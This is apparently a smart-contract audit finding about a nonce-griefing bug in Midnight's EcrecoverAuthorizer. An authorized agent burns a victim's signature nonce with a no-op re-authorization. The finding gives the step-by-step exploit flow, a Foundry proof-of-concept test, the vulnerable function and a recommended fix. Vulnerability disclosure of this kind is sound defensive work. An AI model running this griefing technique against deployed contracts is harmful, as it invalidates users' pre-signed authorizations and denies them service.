### Title
Authorized agent can grief victim's pending pre-signed authorization by consuming nonce via no-op re-authorization - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any address that is an authorized agent of the authorizer on Midnight to sign and submit an `Authorization` struct on the authorizer's behalf. Because the nonce is incremented unconditionally on every successful call regardless of whether the underlying `setIsAuthorized` on Midnight produces any state change, an authorized agent can burn the authorizer's current nonce with a single transaction, permanently invalidating any pending pre-signed authorization the authorizer has distributed off-chain.

### Finding Description

**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24–48):

```
Line 26: require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
...
Line 33-36: require(
    signer == authorization.authorizer ||
    IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
Line 46-47: IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [1](#0-0) [2](#0-1) 

**Root cause:** The `Unauthorized` check at line 34 accepts any signer for whom `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)` is true — i.e., any existing authorized agent of the authorizer. This is the same delegation check used throughout Midnight for on-chain actions, but here it is applied to a nonce-consuming signature flow. An authorized agent can therefore craft and sign a valid `Authorization` struct naming themselves as signer, and the nonce of the `authorization.authorizer` (the victim) is incremented at line 26 before any signature check, and unconditionally on success. [3](#0-2) 

**Attacker inputs and exploit flow:**

Preconditions:
- `isAuthorized[victim][attacker] == true` on Midnight (attacker is an existing authorized agent of victim).
- Victim has distributed off-chain a pre-signed `Authorization(authorizer=victim, authorized=X, isAuthorized=true, nonce=N, deadline=T)`.
- `isAuthorized[victim][EcrecoverAuthorizer] == true` on Midnight (victim previously authorized `EcrecoverAuthorizer`, which is the normal setup).

Attack:
1. Attacker constructs `Authorization(authorizer=victim, authorized=EcrecoverAuthorizer, isAuthorized=true, nonce=N, deadline=future)`.
2. Attacker signs this struct with their own private key, producing a valid ECDSA signature.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.

Execution:
- Line 25: deadline check passes.
- Line 26: `N == nonce[victim]` → passes; `nonce[victim]` becomes `N+1`.
- Lines 28–31: digest computed; `signer = ecrecover(...)` = attacker.
- Line 32: `signer != address(0)` → passes.
- Line 34: `signer == victim` → false; `isAuthorized[victim][attacker]` → **true** → passes.
- Line 47: `Midnight.setIsAuthorized(EcrecoverAuthorizer, true, victim)` → no-op (already authorized).

Result: `nonce[victim]` is now `N+1`. Any relayer or counterparty who tries to submit victim's pre-signed authorization with nonce `N` receives `InvalidNonce` and the authorization is permanently invalidated. [4](#0-3) 

**Why existing checks fail:** The `Unauthorized` check is designed to allow delegation, but it does not distinguish between an agent acting to help the authorizer versus an agent acting to grief the authorizer. There is no guard preventing a no-op re-authorization from consuming the nonce, and no check that the signer is the authorizer themselves when the action is nonce-sensitive.

### Impact Explanation
Any pending pre-signed `Authorization` distributed by the victim (e.g., to a relayer, a counterparty, or embedded in a protocol flow for `take`, `repay`, `withdraw`, `liquidate`, or `claimFee`) is permanently invalidated at the cost of one transaction by any existing authorized agent. The victim must re-sign and re-distribute a new authorization with the incremented nonce. The attacker can repeat this indefinitely as long as they remain an authorized agent, creating a sustained DoS on all signature-based authorization flows for the victim.

### Likelihood Explanation
Preconditions are realistic: users routinely authorize agents (e.g., routers, relayers, bots) on Midnight, and pre-signed authorizations are the primary off-chain UX pattern for `EcrecoverAuthorizer`. The attacker need only be one of the victim's existing authorized agents — a role that is common and expected. The attack costs one transaction and is repeatable every time the victim issues a new pre-signed authorization. No oracle manipulation, admin access, or leaked keys are required.

### Recommendation
Remove the authorized-agent delegation path from `EcrecoverAuthorizer.setIsAuthorized`. Only the authorizer themselves should be permitted to sign an `Authorization` struct that consumes their nonce:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

This is consistent with the EIP-712 intent: the nonce protects the authorizer's own signed intent, not a delegated agent's. Agents who need to act on behalf of the authorizer should use the on-chain `Midnight.setIsAuthorized` directly (which already supports the `onBehalf` delegation pattern without consuming any nonce). [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EcrecoverAuthorizerTest} from "./SetIsAuthorizedWithSigTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract NonceGriefTest is EcrecoverAuthorizerTest {
    function testNonceGriefByAuthorizedAgent() public {
        // Setup: victim authorizes EcrecoverAuthorizer and attacker on Midnight
        vm.startPrank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
        midnight.setIsAuthorized(attacker, true, victim);
        vm.stopPrank();

        // Victim pre-signs an authorization with nonce=0 (e.g., to authorize a relayer)
        Authorization memory victimAuth = Authorization({
            authorizer: victim,
            authorized: relayer,
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        Signature memory victimSig = signAuthorization(victimAuth, victim);

        // Attacker constructs a no-op re-authorization (EcrecoverAuthorizer already authorized)
        // and signs it with their own key
        Authorization memory griefAuth = Authorization({
            authorizer: victim,
            authorized: address(ecrecoverAuthorizer),
            isAuthorized: true,
            nonce: 0,                          // same nonce as victim's pending auth
            deadline: block.timestamp + 1 days
        });
        Signature memory attackerSig = signAuthorization(griefAuth, attacker);

        // Attacker submits — passes Unauthorized check because isAuthorized[victim][attacker]=true
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(griefAuth, attackerSig);

        // Assert: nonce[victim] is now 1
        assertEq(ecrecoverAuthorizer.nonce(victim), 1);

        // Assert: victim's pre-signed auth with nonce=0 now reverts with InvalidNonce
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

        // Assert: Midnight state unchanged (no-op)
        assertEq(midnight.isAuthorized(victim, relayer), false);
    }
}
```

Expected assertions:
- `ecrecoverAuthorizer.nonce(victim) == 1` after attacker's call.
- Victim's pre-signed authorization reverts with `InvalidNonce`.
- `midnight.isAuthorized(victim, relayer) == false` (no meaningful state change from the attack).

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
